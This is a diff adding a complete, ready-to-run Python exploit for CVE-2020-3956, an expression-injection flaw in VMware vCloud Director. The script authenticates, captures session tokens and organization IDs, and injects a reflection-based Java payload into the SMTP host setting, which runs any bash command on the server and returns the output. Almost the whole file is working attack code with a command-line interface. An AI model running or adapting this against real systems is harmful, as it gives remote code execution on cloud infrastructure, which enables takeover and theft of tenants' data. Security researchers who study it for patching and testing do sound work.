@@ -1,0 +1,139 @@
+#!/usr/bin/python
+# Exploit Title: vCloud Director - Remote Code Execution
+# Exploit Author: Tomas Melicher
+# Technical Details: https://citadelo.com/en/blog/full-infrastructure-takeover-of-vmware-cloud-director-CVE-2020-3956/
+# Date: 2020-05-24
+# Vendor Homepage: https://www.vmware.com/
+# Software Link: https://www.vmware.com/products/cloud-director.html
+# Tested On: vCloud Director 9.7.0.15498291
+# Vulnerability Description: 
+#   VMware vCloud Director suffers from an Expression Injection Vulnerability allowing Remote Attackers to gain Remote Code Execution (RCE) via submitting malicious value as a SMTP host name.
+
+import argparse # pip install argparse
+import base64, os, re, requests, sys
+if sys.version_info >= (3, 0):
+    from urllib.parse import urlparse
+else:
+    from urlparse import urlparse
+
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+PAYLOAD_TEMPLATE = "${''.getClass().forName('java.io.BufferedReader').getDeclaredConstructors()[1].newInstance(''.getClass().forName('java.io.InputStreamReader').getDeclaredConstructors()[3].newInstance(''.getClass().forName('java.lang.ProcessBuilder').getDeclaredConstructors()[0].newInstance(['bash','-c','echo COMMAND|base64 -di|bash|base64 -w 0']).start().getInputStream())).readLine()}"
+session = requests.Session()
+
+def login(url, username, password, verbose):
+	target_url = '%s://%s%s'%(url.scheme, url.netloc, url.path)
+	res = session.get(target_url)
+	match = re.search(r'tenant:([^"]+)', res.content, re.IGNORECASE)
+	if match:
+		tenant = match.group(1)
+	else:
+		print('[!] can\'t find tenant identifier')
+		return (None,None,None,None)
+
+	if verbose:
+		print('[*] tenant: %s'%(tenant))
+
+	match = re.search(r'security_check\?[^"]+', res.content, re.IGNORECASE)
+	if match:																			# Cloud Director 9.*
+		login_url = '%s://%s/login/%s'%(url.scheme, url.netloc, match.group(0))
+		res = session.post(login_url, data={'username':username,'password':password})
+		if res.status_code == 401:
+			print('[!] invalid credentials')
+			return (None,None,None,None)
+	else:																				# Cloud Director 10.*
+		match = re.search(r'/cloudapi/.*/sessions', res.content, re.IGNORECASE)
+		if match:
+			login_url = '%s://%s%s'%(url.scheme, url.netloc, match.group(0))
+			headers = {
+				'Authorization': 'Basic %s'%(base64.b64encode('%s@%s:%s'%(username,tenant,password))),
+				'Accept': 'application/json;version=29.0',
+				'Content-type': 'application/json;version=29.0'
+			}
+			res = session.post(login_url, headers=headers)
+			if res.status_code == 401:
+				print('[!] invalid credentials')
+				return (None,None,None,None)
+		else:
+			print('[!] url for login form was not found')
+			return (None,None,None,None)
+
+	cookies = session.cookies.get_dict()
+	jwt = cookies['vcloud_jwt']
+	session_id = cookies['vcloud_session_id']
+
+	if verbose:
+		print('[*] jwt token: %s'%(jwt))
+		print('[*] session_id: %s'%(session_id))
+
+	res = session.get(target_url)
+	match = re.search(r'organization : \'([^\']+)', res.content, re.IGNORECASE)
+	if match is None:
+		print('[!] organization not found')
+		return (None,None,None,None)
+	organization = match.group(1)
+	if verbose:
+		print('[*] organization name: %s'%(organization))
+
+	match = re.search(r'orgId : \'([^\']+)', res.content)
+	if match is None:
+		print('[!] orgId not found')
+		return (None,None,None,None)
+	org_id = match.group(1)
+	if verbose:
+		print('[*] organization identifier: %s'%(org_id))
+
+	return (jwt,session_id,organization,org_id)
+
+
+def exploit(url, username, password, command, verbose):
+	(jwt,session_id,organization,org_id) = login(url, username, password, verbose)
+	if jwt is None:
+		return
+
+	headers = {
+		'Accept': 'application/*+xml;version=29.0',
+		'Authorization': 'Bearer %s'%jwt,
+		'x-vcloud-authorization': session_id
+	}
+	admin_url = '%s://%s/api/admin/'%(url.scheme, url.netloc)
+	res = session.get(admin_url, headers=headers)
+	match = re.search(r'<description>\s*([^<\s]+)', res.content, re.IGNORECASE)
+	if match:
+		version = match.group(1)
+		if verbose:
+			print('[*] detected version of Cloud Director: %s'%(version))
+	else:
+		version = None
+		print('[!] can\'t find version of Cloud Director, assuming it is more than 10.0')
+
+	email_settings_url = '%s://%s/api/admin/org/%s/settings/email'%(url.scheme, url.netloc, org_id)
+
+	payload = PAYLOAD_TEMPLATE.replace('COMMAND', base64.b64encode('(%s) 2>&1'%command))
+	data = '<root:OrgEmailSettings xmlns:root="http://www.vmware.com/vcloud/v1.5"><root:IsDefaultSmtpServer>false</root:IsDefaultSmtpServer>'
+	data += '<root:IsDefaultOrgEmail>true</root:IsDefaultOrgEmail><root:FromEmailAddress/><root:DefaultSubjectPrefix/>'
+	data += '<root:IsAlertEmailToAllAdmins>true</root:IsAlertEmailToAllAdmins><root:AlertEmailTo/><root:SmtpServerSettings>'
+	data += '<root:IsUseAuthentication>false</root:IsUseAuthentication><root:Host>%s</root:Host><root:Port>25</root:Port>'%(payload)
+	data += '<root:Username/><root:Password/></root:SmtpServerSettings></root:OrgEmailSettings>'
+	res = session.put(email_settings_url, data=data, headers=headers)
+	match = re.search(r'value:\s*\[([^\]]+)\]', res.content)
+
+	if verbose:
+		print('')
+	try:
+		print(base64.b64decode(match.group(1)))
+	except Exception:
+		print(res.content)
+
+
+parser = argparse.ArgumentParser(usage='%(prog)s -t target -u username -p password [-c command] [--check]')
+parser.add_argument('-v', action='store_true')
+parser.add_argument('-t', metavar='target', help='url to html5 client (http://example.com/tenant/my_company)', required=True)
+parser.add_argument('-u', metavar='username', required=True)
+parser.add_argument('-p', metavar='password', required=True)
+parser.add_argument('-c', metavar='command', help='command to execute', default='id')
+args = parser.parse_args()
+
+url = urlparse(args.t)
+exploit(url, args.u, args.p, args.c, args.v)
